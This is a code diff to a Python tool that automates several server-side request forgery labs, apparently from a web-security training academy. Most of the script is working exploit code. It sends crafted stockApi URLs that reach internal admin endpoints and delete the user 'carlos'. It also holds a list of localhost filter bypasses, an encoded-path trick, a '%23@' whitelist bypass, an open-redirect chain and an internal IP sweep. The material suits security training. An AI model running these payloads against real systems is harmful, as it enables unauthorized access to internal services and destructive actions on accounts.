@@ -17,12 +17,17 @@ class textcolor:
 class SSRFVulnerability:
 
     def __init__(self, base_url):
+        # assign base URL for all lab scenarios
         self.base_url = base_url
+        self.verify = 'Carlos'
+        self.banner = 'Congratulations, you solved the lab!'
 
     def http_request(self, url):
+        '''
+        This is a common function used to send HTTP requests with customized payloads
+        '''
         payload = {'stockApi': url}
         headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}
-
         try:
             response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
             return response
@@ -39,12 +44,17 @@ class SSRFVulnerability:
         return 0
 
     def local_system(self):
-        
+        '''
+        Lab 1: Basic SSRF against the local server
+        '''
         payloadURL = 'http://localhost/admin/delete?username=carlos'
         print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
-        return 1 if self.http_request(payloadURL).content else 0
+        return 1 if self.banner in self.http_request(payloadURL).text else 0
 
     def internal_system(self):
+        '''
+        Lab 2: Basic SSRF against another back-end system
+        '''
         try:
             for i in range(1, 256):
 
@@ -63,6 +73,9 @@ class SSRFVulnerability:
             return 0
         
     def blacklist_filter(self):
+        '''
+        Lab 3: SSRF with blacklist-based input filter
+        '''
         # bypasses for localhost domain
         bypasses = ['localhost','127.0.0.1', '127.1', '::1', '0:0:0:0:0:0:0:1', '::ffff:127.0.0.1', '127%2e0%2e0%2e1', '127%2e1']
         try:
@@ -75,13 +88,40 @@ class SSRFVulnerability:
                     payloadURL = 'http://'+i+'/%61dmin/delete?username=carlos'
                     print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                     response = self.http_request(payloadURL)
-                    return 1 if response.content else 0
+                    return 1 if self.banner in response.text else 0
+        except:
+            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
+            return 0
+        
+    def whitelist_filter(self):
+        '''
+        Lab 4: SSRF with whitelist-based input filter
+        '''
+        # appending localhost with original domain using URL fragmentation 
+        payloadURL = 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'
+        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+        try:
+            response = self.http_request(payloadURL)
+            return 1 if self.banner in response.text else 0
+            
+        except:
+            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
+            return 0
+        
+    def open_redirection(self):
+        '''
+        Lab 5: Bypassing SSRF filters via open redirection
+        '''
+        payloadURL = '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
+        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+        try:
+            response = self.http_request(payloadURL)
+            return 1 if self.verify not in response.text else 0
+            
         except:
             print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
             return 0
 
-def encode(string):
-    return "".join("%{0:0>2x}".format(ord(char)) for char in string)
 
 def validate_url(url):
     parsed_url = urlparse(url)
@@ -90,7 +130,10 @@ def validate_url(url):
     return False
 
 def handle_choice(number, instance):
-
+    '''
+    This function is used to handle different user input choices that 
+    executes different lab exercises with their respective payloads
+    '''
     if number == 1:
         if instance.local_system():
             print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)
@@ -102,11 +145,21 @@ def handle_choice(number, instance):
     elif number == 3:
         if instance.blacklist_filter():
             print(textcolor.OKGREEN+"Blacklist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)
+
+    elif number == 4:
+        if instance.whitelist_filter():
+            isFailed = False
+            print(textcolor.OKGREEN+"Whitelist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)
+
+    elif number == 5:
+        if instance.open_redirection():
+            isFailed = False
+            print(textcolor.OKGREEN+"Open Redirection: Username Deleted Successfully\n"+textcolor.ENDC)
+
     else:
         print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)
 
 def main():
-
     try:
         url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
     except:
@@ -121,7 +174,9 @@ def main():
     data = [
         [textcolor.OKBLUE+"(1)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC],
         [textcolor.OKBLUE+"(2)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
-        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
+        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC],
+        [textcolor.OKBLUE+"(4)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with whitelist-based input filter"+textcolor.ENDC],
+        [textcolor.OKBLUE+"(5)"+textcolor.ENDC, textcolor.OKBLUE+"Bypassing SSRF filters via open redirection"+textcolor.ENDC]
     ]
 
     headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC]
